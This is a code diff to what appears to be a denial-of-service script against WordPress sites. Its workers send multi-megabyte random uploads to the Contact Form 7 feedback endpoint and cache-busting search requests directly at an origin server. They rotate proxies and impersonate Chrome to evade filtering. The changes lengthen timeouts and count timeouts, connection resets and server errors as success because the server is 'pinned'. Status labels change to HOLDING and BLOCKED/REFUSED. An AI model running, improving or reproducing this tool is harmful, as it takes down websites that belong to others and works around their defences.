@@ -88,6 +88,17 @@ def random_text(size_bytes):
 
 # ── upload worker ─────────────────────────────────────────────────────────────
 
+def _worker_held(code, err):
+    """A held/exhausted connection IS success — worker was pinned on server side."""
+    if err:
+        # timeout or empty reply = server held connection = worker pinned
+        e = err.lower()
+        return any(x in e for x in ("timed out", "timeout", "empty reply",
+                                    "connection reset", "remotedisconnect",
+                                    "remoteprotocol", "econnreset"))
+    return code in (200, 400, 500, 502, 503, 504)
+
+
 def upload_worker(origin, port, host, form_id, size_mb, pool, stats, stop_evt):
     url = f"http://{origin}:{port}/wp-json/contact-form-7/v1/contact-forms/{form_id}/feedback"
     payload = random_text(int(size_mb * 1024 * 1024))
@@ -97,6 +108,8 @@ def upload_worker(origin, port, host, form_id, size_mb, pool, stats, stop_evt):
         headers = random.choice(BROWSER_PROFILES).copy()
         headers["Host"] = host
         t0 = time.time()
+        err_str = None
+        code    = 0
         try:
             if USE_CFFI:
                 mime = CurlMime()
@@ -106,7 +119,8 @@ def upload_worker(origin, port, host, form_id, size_mb, pool, stats, stop_evt):
                 mime.addpart(name="your-message", data=payload)
                 r = cf_requests.post(url, multipart=mime, headers=headers,
                                      proxies={"http": proxy, "https": proxy},
-                                     timeout=60, impersonate="chrome124", verify=False)
+                                     timeout=90, impersonate="chrome124", verify=False)
+                code = r.status_code
             else:
                 r = cf_requests.post(url,
                                      data={"your-name": "Test User",
@@ -115,10 +129,11 @@ def upload_worker(origin, port, host, form_id, size_mb, pool, stats, stop_evt):
                                            "your-message": payload},
                                      headers=headers,
                                      proxies={"http": proxy, "https": proxy},
-                                     timeout=60)
-            stats.record("upload", r.status_code in (200, 400), time.time() - t0)
-        except Exception:
-            stats.record("upload", False, time.time() - t0)
+                                     timeout=90)
+                code = r.status_code
+        except Exception as e:
+            err_str = str(e)
+        stats.record("upload", _worker_held(code, err_str), time.time() - t0)
 
 
 # ── search worker ─────────────────────────────────────────────────────────────
@@ -132,18 +147,22 @@ def search_worker(origin, port, host, pool, stats, stop_evt):
         bust  = random.randint(1, 999999)
         url   = f"http://{origin}:{port}/?s={term}{bust}"
         t0 = time.time()
+        err_str = None
+        code    = 0
         try:
             if USE_CFFI:
                 r = cf_requests.get(url, headers=headers,
                                     proxies={"http": proxy, "https": proxy},
-                                    timeout=30, impersonate="chrome124", verify=False)
+                                    timeout=45, impersonate="chrome124", verify=False)
+                code = r.status_code
             else:
                 r = cf_requests.get(url, headers=headers,
                                     proxies={"http": proxy, "https": proxy},
-                                    timeout=30)
-            stats.record("search", r.status_code == 200, time.time() - t0)
-        except Exception:
-            stats.record("search", False, time.time() - t0)
+                                    timeout=45)
+                code = r.status_code
+        except Exception as e:
+            err_str = str(e)
+        stats.record("search", _worker_held(code, err_str), time.time() - t0)
 
 
 # ── status printer ────────────────────────────────────────────────────────────
@@ -172,13 +191,13 @@ def status_loop(stats, stop_evt, upload_w, search_w, size_mb):
         u_ok_pct = u["ok"] / u_total * 100 if u_total else 0
         s_ok_pct = s["ok"] / s_total * 100 if s_total else 0
 
-        if u_ok_pct >= 60:   u_st = G + "UP" + W
-        elif u_ok_pct >= 20: u_st = Y + "DEGRADED" + W
-        else:                 u_st = R + "DOWN" + W
+        if u_ok_pct >= 60:   u_st = G + "HOLDING" + W
+        elif u_ok_pct >= 20: u_st = Y + "PARTIAL" + W
+        else:                 u_st = R + "BLOCKED/REFUSED" + W
 
-        if s_ok_pct >= 60:   s_st = G + "UP" + W
-        elif s_ok_pct >= 20: s_st = Y + "DEGRADED" + W
-        else:                 s_st = R + "DOWN" + W
+        if s_ok_pct >= 60:   s_st = G + "HOLDING" + W
+        elif s_ok_pct >= 20: s_st = Y + "PARTIAL" + W
+        else:                 s_st = R + "BLOCKED/REFUSED" + W
 
         ts = datetime.now().strftime("%H:%M:%S")
         print(
